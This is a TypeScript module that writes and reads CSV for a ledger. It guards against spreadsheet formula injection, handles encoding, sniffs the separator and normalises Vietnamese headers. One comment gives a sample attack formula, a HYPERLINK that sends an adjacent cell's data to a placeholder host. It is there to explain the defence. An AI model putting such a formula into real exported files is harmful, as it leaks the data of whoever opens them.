/**
 * CSV, to RFC 4180 — and defended against the spreadsheet.
 *
 * Two hazards, neither of which is about commas.
 *
 * **Formula injection.** A cell beginning `=`, `+`, `-`, `@`, tab or carriage
 * return is interpreted by Excel, Sheets and LibreOffice as a *formula*, not
 * as text. `=HYPERLINK("http://x/?"&A1,"Click")` in an exported description
 * exfiltrates the row next to it the moment someone opens the file and clicks.
 * Nothing about this is exotic: the attacker only needs to be able to type an
 * entry description, which on a ledger is the point.
 *
 * The fix is to prefix the offending cell with a single quote, which the
 * spreadsheet strips on display and the formula parser never sees. Quoting the
 * field is not enough — a quoted cell is still parsed as a formula.
 *
 * **Encoding.** Excel on Windows assumes the system codepage unless the file
 * opens with a UTF-8 byte-order mark. Without it, every non-ASCII character in
 * an account name arrives as mojibake, and the person exporting concludes the
 * ledger is broken.
 */

const NEEDS_QUOTING = /[",\r\n]/u;

/** Characters a spreadsheet treats as the start of a formula. */
const FORMULA_START = /^[=+\-@\t\r]/u;

export const UTF8_BOM = '﻿';

export function csvCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';

  const text = String(value);
  // Neutralised before quoting, so the guard survives the escaping.
  const safe = FORMULA_START.test(text) ? `'${text}` : text;

  return NEEDS_QUOTING.test(safe) ? `"${safe.replaceAll('"', '""')}"` : safe;
}

export function csvRow(cells: readonly (string | number | null | undefined)[]): string {
  return cells.map(csvCell).join(',');
}

/**
 * CRLF line endings, because RFC 4180 says so and because Excel's importer is
 * the one consumer that still cares.
 */
export function toCsv(
  header: readonly string[],
  rows: readonly (readonly (string | number | null | undefined)[])[],
): string {
  return `${UTF8_BOM}${[csvRow(header), ...rows.map(csvRow)].join('\r\n')}\r\n`;
}

/**
 * A `Content-Disposition` a browser will honour and a filesystem will accept.
 *
 * Both the plain and the RFC 5987 form, because the plain one cannot carry a
 * non-ASCII character and older clients ignore the encoded one.
 */
export function attachment(filename: string): string {
  const ascii = filename.replaceAll(/[^\w.\-]/gu, '_');
  return `attachment; filename="${ascii}"; filename*=UTF-8''${encodeURIComponent(filename)}`;
}

/**
 * Reading it back, which is a different problem.
 *
 * The export side above defends the spreadsheet from us. This side defends us
 * from the spreadsheet, and the hazards are again not about commas:
 *
 * **What arrives is usually not a CSV file.** Somebody selects a block in
 * Excel and presses ⌘C, and what lands in the box is *tab*-separated. A parser
 * that splits on commas turns each row into one field and reports that the
 * file has no columns, which reads as "the import is broken" rather than "that
 * is not what I expected".
 *
 * **A comma is not the separator everywhere.** Excel writes CSV using the
 * system list separator, and in Vietnamese, German, French and most other
 * European locales that is a **semicolon** — because the comma is the decimal
 * mark. A file exported from a colleague's laptop is a legitimate CSV that a
 * comma-splitting parser reads as gibberish.
 *
 * So the separator is sniffed from the header rather than assumed, and the
 * three candidates are tab, semicolon and comma.
 */

const SEPARATORS = ['\t', ';', ','] as const;

/**
 * Which separator this text uses, decided on the header line alone.
 *
 * The header is used rather than the whole document because a quoted field
 * further down may legitimately contain any of the three, and because the
 * header is the one line guaranteed to have every column in it. Ties go to the
 * earliest candidate: a tab in a header is never decorative, while a comma
 * inside an unquoted description is common.
 */
export function sniffSeparator(text: string): string {
  const header = stripBom(text).split(/\r?\n/u)[0] ?? '';
  let best = ',';
  let bestCount = 0;
  for (const separator of SEPARATORS) {
    const count = header.split(separator).length - 1;
    if (count > bestCount) {
      best = separator;
      bestCount = count;
    }
  }
  return best;
}

export function stripBom(text: string): string {
  return text.startsWith(UTF8_BOM) ? text.slice(1) : text;
}

/**
 * RFC 4180, read one character at a time.
 *
 * A regular expression cannot do this correctly, which is worth stating
 * because the one-line `split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/)` is everywhere
 * and is wrong: a quoted field may contain a *newline*, so the document cannot
 * even be split into lines before it is parsed. An address field with a line
 * break in it is not exotic — it is what a shipping address looks like.
 *
 * Blank lines are dropped. A trailing newline is the normal case, and a row of
 * one empty field is never anything anybody meant.
 */
export function parseDelimited(text: string, separator = sniffSeparator(text)): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let quoted = false;
  const body = stripBom(text);

  const endField = () => {
    row.push(field);
    field = '';
  };
  const endRow = () => {
    endField();
    if (row.length > 1 || row[0] !== '') rows.push(row);
    row = [];
  };

  for (let i = 0; i < body.length; i += 1) {
    const char = body[i];

    if (quoted) {
      if (char !== '"') {
        field += char;
      } else if (body[i + 1] === '"') {
        // A doubled quote inside a quoted field is one literal quote.
        field += '"';
        i += 1;
      } else {
        quoted = false;
      }
      continue;
    }

    if (char === '"' && field === '') {
      quoted = true;
    } else if (char === separator) {
      endField();
    } else if (char === '\r') {
      // Swallowed; the \n that follows ends the row. A lone \r — classic Mac
      // line endings, which Excel still produces on request — ends it here.
      if (body[i + 1] !== '\n') endRow();
    } else if (char === '\n') {
      endRow();
    } else {
      field += char;
    }
  }

  if (field !== '' || row.length > 0) endRow();
  return rows;
}

/**
 * Header row plus data rows, with the header normalised for matching.
 *
 * Lower-cased and stripped of everything but letters and digits, so `"Unit
 * Cost"`, `unit_cost` and `UNITCOST` are the same column. People type headers;
 * insisting on an exact spelling is how an import that would have worked gets
 * rejected for a capital letter.
 */
export function parseTable(text: string): { headers: string[]; rows: string[][] } {
  const [header = [], ...rows] = parseDelimited(text);
  return { headers: header.map(normaliseHeader), rows };
}

export function normaliseHeader(value: string): string {
  return (
    value
      .trim()
      .toLowerCase()
      // Accents are *decomposed* and the marks removed, rather than the
      // accented letter being deleted along with the punctuation. Deleting it
      // turns `Mã hàng` into `mhng`, which matches nothing and reads to the
      // person who typed it as the importer not supporting Vietnamese.
      .normalize('NFD')
      .replaceAll(/\p{Diacritic}/gu, '')
      // Đ is a letter in its own right — D with a stroke — not a D with a mark
      // on it, so NFD leaves it alone and it has to be mapped by hand. Without
      // this, `Đơn vị` normalises to `nvi`.
      .replaceAll(/[đĐ]/gu, 'd')
      .replaceAll(/[^a-z0-9]/gu, '')
  );
}
